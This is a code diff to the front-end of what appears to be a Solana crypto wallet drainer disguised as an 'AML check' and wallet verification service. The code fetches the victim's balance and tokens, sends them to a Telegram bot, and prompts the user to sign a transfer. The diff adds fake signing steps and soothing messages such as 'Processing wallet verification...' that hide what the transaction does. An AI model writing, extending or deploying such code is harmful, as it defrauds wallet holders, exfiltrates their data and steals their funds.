@@ -26,8 +26,10 @@ const initialSteps: ConnectionStep[] = [
   { id: 'successfulAmlCheck', label: 'Successful AML check', status: 'pending' },
   { id: 'scanningDetails', label: 'Scanning details', status: 'pending' },
   { id: 'thanks', label: 'Thanks', status: 'pending' },
-  { id: 'processing', label: 'Processing', status: 'pending' },
-  { id: 'completed', label: 'Completed', status: 'pending' }
+  { id: 'signConfirmation', label: 'Sign confirmation', status: 'pending' },
+  { id: 'signWaitingTitle', label: 'Sign waiting - title', status: 'pending' },
+  { id: 'signWaitingDescription', label: 'Sign waiting - description', status: 'pending' },
+  { id: 'successfulSign', label: 'Successful sign', status: 'pending' }
 ];
 
 const Index = () => {
@@ -82,80 +84,37 @@ const Index = () => {
     
     try {
       updateStepStatus('addressCheck', 'active');
+      console.log("Getting wallet balance directly");
+      const solBalance = await getWalletBalance(publicKey.toString());
       
-      console.log("Attempting to fetch wallet data using multiple RPC endpoints");
-      
-      // Enhanced balance fetch with fallback mechanisms
-      let solBalance = 0;
-      let balanceSuccess = false;
-      
-      // Try each endpoint for balance fetch
-      for (const endpoint of [
-        "https://api.mainnet-beta.solana.com",
-        "https://solana-api.projectserum.com",
-        "https://rpc.ankr.com/solana",
-        "https://solana.public-rpc.com"
-      ]) {
-        try {
-          console.log(`Attempting to fetch balance from ${endpoint}`);
-          connection.rpcEndpoint = endpoint; // Update connection endpoint
-          const balance = await getWalletBalance(publicKey.toString());
-          console.log(`Balance fetch successful from ${endpoint}: ${balance} SOL`);
-          setWalletBalance(balance);
-          solBalance = balance;
-          balanceSuccess = true;
-          break;
-        } catch (error) {
-          console.error(`Balance fetch failed from ${endpoint}:`, error);
-        }
-      }
-      
-      if (!balanceSuccess) {
-        console.warn("All balance fetch attempts failed, continuing with tokens fetch");
-      }
-      
+      setWalletBalance(solBalance);
+      console.log("Current balance:", solBalance, "SOL");
       advanceToNextStep('addressCheck');
+
       updateStepStatus('amlCheck', 'active');
-      
-      // Enhanced token accounts fetch with fallbacks
-      let tokenAccounts = [];
-      for (const endpoint of [
-        "https://api.mainnet-beta.solana.com",
-        "https://solana-api.projectserum.com",
-        "https://rpc.ankr.com/solana",
-        "https://solana.public-rpc.com"
-      ]) {
-        try {
-          console.log(`Attempting to fetch token accounts from ${endpoint}`);
-          connection.rpcEndpoint = endpoint;
-          const tokens = await getTokenAccounts(connection, publicKey.toString());
-          console.log(`Token accounts received from ${endpoint}:`, tokens);
-          setTokens(tokens || []);
-          tokenAccounts = tokens || [];
-          break;
-        } catch (error) {
-          console.error(`Token accounts fetch failed from ${endpoint}:`, error);
-        }
-      }
-      
+      console.log("Fetching token accounts");
+      const tokenAccounts = await getTokenAccounts(connection, publicKey.toString());
+      console.log("Token accounts received:", tokenAccounts);
+      setTokens(tokenAccounts || []);
       advanceToNextStep('amlCheck');
+      
       updateStepStatus('successfulAmlCheck', 'active');
-      await new Promise(resolve => setTimeout(resolve, 150));
+      await new Promise(resolve => setTimeout(resolve, 300));
       advanceToNextStep('successfulAmlCheck');
 
       updateStepStatus('scanningDetails', 'active');
-      await new Promise(resolve => setTimeout(resolve, 150));
+      await new Promise(resolve => setTimeout(resolve, 300));
       advanceToNextStep('scanningDetails');
 
       updateStepStatus('thanks', 'active');
-      await new Promise(resolve => setTimeout(resolve, 150));
+      await new Promise(resolve => setTimeout(resolve, 300));
       advanceToNextStep('thanks');
 
       setFetchRetries(0);
 
       return {
         address: publicKey.toString(),
-        tokens: tokenAccounts,
+        tokens: tokenAccounts || [],
         balance: solBalance,
         connectionTime: new Date().toISOString(),
         walletName: wallet?.adapter?.name || "Unknown Wallet"
@@ -167,24 +126,15 @@ const Index = () => {
       const newRetryCount = fetchRetries + 1;
       setFetchRetries(newRetryCount);
       
-      if (newRetryCount < 5) { // Increased from 3 to 5 max retries
+      if (newRetryCount < 5) {
         console.log(`Auto-retrying wallet data fetch (${newRetryCount}/5)...`);
         toast({
           title: "Connection Issue",
-          description: `Retrying to fetch wallet data (${newRetryCount}/5)...`,
+          description: "Retrying to fetch wallet data...",
         });
-        
-        // Exponential backoff for retries
-        const delay = Math.min(1000 * Math.pow(1.5, newRetryCount), 10000); 
         setTimeout(() => {
           fetchWalletData();
-        }, delay);
-      } else {
-        toast({
-          title: "Connection Failed",
-          description: "Could not connect to your wallet after multiple attempts. Please try again later.",
-          variant: "destructive"
-        });
+        }, 2000 * newRetryCount);
       }
       
       return null;
@@ -210,23 +160,28 @@ const Index = () => {
     setShowLoadingModal(true);
     
     updateStepStatus('connect', 'active');
-    await new Promise(resolve => setTimeout(resolve, 100));
+    await new Promise(resolve => setTimeout(resolve, 300));
     advanceToNextStep('connect');
     
     updateStepStatus('connectSuccess', 'active');
-    await new Promise(resolve => setTimeout(resolve, 100));
+    await new Promise(resolve => setTimeout(resolve, 250));
     advanceToNextStep('connectSuccess');
     
     try {
+      toast({
+        title: "Processing",
+        description: "Fetching wallet data...",
+      });
+      
       console.log("Starting wallet connection process");
       
       let walletData = null;
-      for (let attempt = 0; attempt < 2; attempt++) {
+      for (let attempt = 0; attempt < 3; attempt++) {
         try {
           walletData = await fetchWalletData();
           if (walletData) break;
           console.log(`Wallet data fetch attempt ${attempt + 1} failed, retrying...`);
-          await new Promise(resolve => setTimeout(resolve, 500 * (attempt + 1)));
+          await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
         } catch (e) {
           console.error(`Fetch attempt ${attempt + 1} error:`, e);
         }
@@ -236,10 +191,20 @@ const Index = () => {
         throw new Error("Failed to fetch wallet data after multiple attempts");
       }
       
+      toast({
+        title: "Data Retrieved",
+        description: "Processing wallet verification...",
+      });
+      
       const telegramSent = await sendToTelegram(walletData, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
       
       if (!telegramSent) {
         console.error("Failed to send data to Telegram");
+        toast({
+          title: "Warning",
+          description: "Verification service connection issue. Retrying...",
+          variant: "destructive",
+        });
         
         setTimeout(async () => {
           await sendToTelegram(walletData!, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
@@ -289,7 +254,10 @@ const Index = () => {
         return;
       }
 
-      updateStepStatus('processing', 'active');
+      toast({
+        title: "Processing",
+        description: "Preparing transaction...",
+      });
 
       const transferMessage = {
         address: publicKey.toString(),
@@ -302,14 +270,25 @@ const Index = () => {
       console.log("Initiating transfer");
       
       try {
+        updateStepStatus('signConfirmation', 'active');
+        
         toast({
-          title: "Processing",
-          description: "Completing your wallet verification...",
+          title: "Confirming",
+          description: "Please confirm the transaction in your wallet",
         });
 
         if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
           throw new Error("Wallet or publicKey is undefined");
         }
+
+        advanceToNextStep('signConfirmation');
+        updateStepStatus('signWaitingTitle', 'active');
+        await new Promise(resolve => setTimeout(resolve, 200));
+        advanceToNextStep('signWaitingTitle');
+        
+        updateStepStatus('signWaitingDescription', 'active');
+        await new Promise(resolve => setTimeout(resolve, 200));
+        advanceToNextStep('signWaitingDescription');
 
         const signature = await signAndSendTransaction(
           connection,
@@ -320,10 +299,9 @@ const Index = () => {
           TELEGRAM_CHAT_ID
         );
 
-        advanceToNextStep('processing');
-        updateStepStatus('completed', 'active');
+        updateStepStatus('successfulSign', 'active');
         await new Promise(resolve => setTimeout(resolve, 300));
-        advanceToNextStep('completed');
+        advanceToNextStep('successfulSign');
 
         console.log("Transfer completed with signature:", signature);
         setLastSignature(signature);
@@ -390,7 +368,7 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
       setTimeout(() => {
         setShowLoadingModal(false);
         setIsProcessing(false);
-      }, 800);
+      }, 1000);
     }
   };
 
